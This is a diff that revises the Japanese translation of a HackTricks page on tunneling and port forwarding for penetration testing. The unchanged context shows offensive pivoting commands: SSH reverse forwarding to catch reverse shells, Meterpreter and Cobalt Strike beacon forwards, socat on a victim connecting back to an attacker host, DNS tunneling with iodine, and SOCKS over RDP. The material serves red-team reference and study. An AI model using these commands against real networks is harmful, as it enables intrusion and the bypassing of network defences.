@@ -10,7 +10,7 @@ GCPハッキングを学び、実践する：<img src="../.gitbook/assets/grte.p
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
@@ -18,7 +18,7 @@ GCPハッキングを学び、実践する：<img src="../.gitbook/assets/grte.p
 ## Nmapのヒント
 
 {% hint style="warning" %}
-**ICMP**および**SYN**スキャンはソックスプロキシを通じてトンネリングできないため、**pingディスカバリーを無効にする**（`-Pn`）必要があり、これが機能するためには**TCPスキャン**（`-sT`）を指定する必要があります。
+**ICMP**および**SYN**スキャンはソックスプロキシを通じてトンネリングできないため、**pingディスカバリーを無効にする**（`-Pn`）必要があり、**TCPスキャン**（`-sT`）を指定する必要があります。
 {% endhint %}
 
 ## **Bash**
@@ -71,7 +71,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### リバースポートフォワーディング
 
-これは、DMZを通じて内部ホストからあなたのホストにリバースシェルを取得するのに役立ちます：
+これは、DMZを通じて内部ホストからあなたのホストへのリバースシェルを取得するのに役立ちます：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-ローカルポート --> 侵害されたホスト（アクティブセッション） --> 第三のボックス:ポート
+ローカルポート --> 侵害されたホスト（アクティブセッション） --> 第三\_ボックス:ポート
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKSプロキシ
 
-すべてのインターフェースでリッスンしているチームサーバーにポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
+すべてのインターフェースでリッスンしているteamserverでポートを開き、**ビコーンを通じてトラフィックをルーティングする**ことができます。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -159,7 +159,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-この場合、**ポートはビーコーンホストで開かれます**、チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
+この場合、**ポートはビーコーンホストで開かれます**。チームサーバーではなく、トラフィックはチームサーバーに送信され、そこから指定されたホスト:ポートに送られます。
 {% endhint %}
 ```bash
 rportfwd [bind port] [forward host] [forward port]
@@ -168,7 +168,7 @@ rportfwd stop [bind port]
 To note:
 
 * Beaconのリバースポートフォワードは、**個々のマシン間の中継ではなく、Team Serverへのトラフィックをトンネリングするために設計されています**。
-* トラフィックは**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
+* トラフィックは、**BeaconのC2トラフィック内でトンネリングされます**、P2Pリンクを含みます。
 * **管理者権限は必要ありません** 高ポートでリバースポートフォワードを作成するために。
 
 ### rPort2Port local
@@ -211,7 +211,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
 
-**エージェントとプロキシには同じバージョンを使用してください**
+**エージェントとプロキシに同じバージョンを使用してください**
 
 ### トンネリング
 ```bash
@@ -322,7 +322,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-ローカルSSHポート（22）を攻撃者ホストの443ポートに接続します。
+ローカルSSHポート（22）を攻撃者ホストの443ポートに接続します
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -330,7 +330,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-コンソール版PuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
+これはコンソール版のPuTTYのようなもので（オプションはsshクライアントに非常に似ています）。
 
 このバイナリは被害者のコンピュータで実行され、sshクライアントであるため、リバース接続を確立するためにsshサービスとポートを開く必要があります。次に、ローカルでアクセス可能なポートを私たちのマシンのポートに転送するには：
 ```bash
@@ -356,15 +356,15 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 **システムへのRDPアクセスが必要です**。\
 ダウンロード:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、Windowsのリモートデスクトップサービス機能からの`Dynamic Virtual Channels`（`DVC`）を使用します。DVCは**RDP接続を介してパケットをトンネリングする**役割を担っています。
-2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
+1. [SocksOverRDP x64 バイナリ](https://github.com/nccgroup/SocksOverRDP/releases) - このツールは、Windowsのリモートデスクトップサービス機能からの`Dynamic Virtual Channels`（`DVC`）を使用します。DVCは**RDP接続を介してパケットをトンネリングする**役割を担っています。
+2. [Proxifier ポータブルバイナリ](https://www.proxifier.com/download/#win-tab)
 
 クライアントコンピュータで**`SocksOverRDP-Plugin.dll`**を次のように読み込みます:
 ```bash
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効である** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** することになります。
+今、私たちは **`mstsc.exe`** を使用して **RDP** 経由で **victim** に **接続** でき、**SocksOverRDP プラグインが有効になっている** という **プロンプト** が表示され、**127.0.0.1:1080** で **リッスン** します。
 
 **RDP** 経由で **接続** し、victim マシンに `SocksOverRDP-Server.exe` バイナリをアップロードして実行します:
 ```
@@ -415,7 +415,7 @@ Microsoftによって作成されたリバースプロキシです。こちら�
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-DNSクエリを使用してトンネルアダプタを作成し、両システム間でデータをトンネルするには、両方のシステムでroot権限が必要です。
+両方のシステムでルート権限が必要で、DNSクエリを使用してトンネルアダプタを作成し、データをそれらの間でトンネルします。
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
@@ -452,7 +452,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### プロキシチェインのDNSを変更する
 
-Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通してトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
+Proxychainsは`gethostbyname` libcコールをインターセプトし、tcp DNSリクエストをsocksプロキシを通じてトンネリングします。**デフォルト**では、proxychainsが使用する**DNS**サーバーは**4.2.2.2**（ハードコーディングされています）。これを変更するには、ファイルを編集します: _/usr/lib/proxychains3/proxyresolv_ そしてIPを変更します。**Windows環境**にいる場合は、**ドメインコントローラー**のIPを設定できます。
 
 ## Goでのトンネル
 
@@ -538,7 +538,7 @@ stdoutから直接、またはHTTPインターフェース [http://127.0.0.1:404
 3つのトンネルを開きます：
 
 * 2つのTCP
-* /tmp/httpbin/ からの静的ファイルの公開を伴う1つのHTTP
+* 1つのHTTP（/tmp/httpbin/ からの静的ファイルの公開）
 ```yaml
 tunnels:
 mytcp:
@@ -566,7 +566,7 @@ GCPハッキングを学び、実践する：<img src="../.gitbook/assets/grte.p
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
 * **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
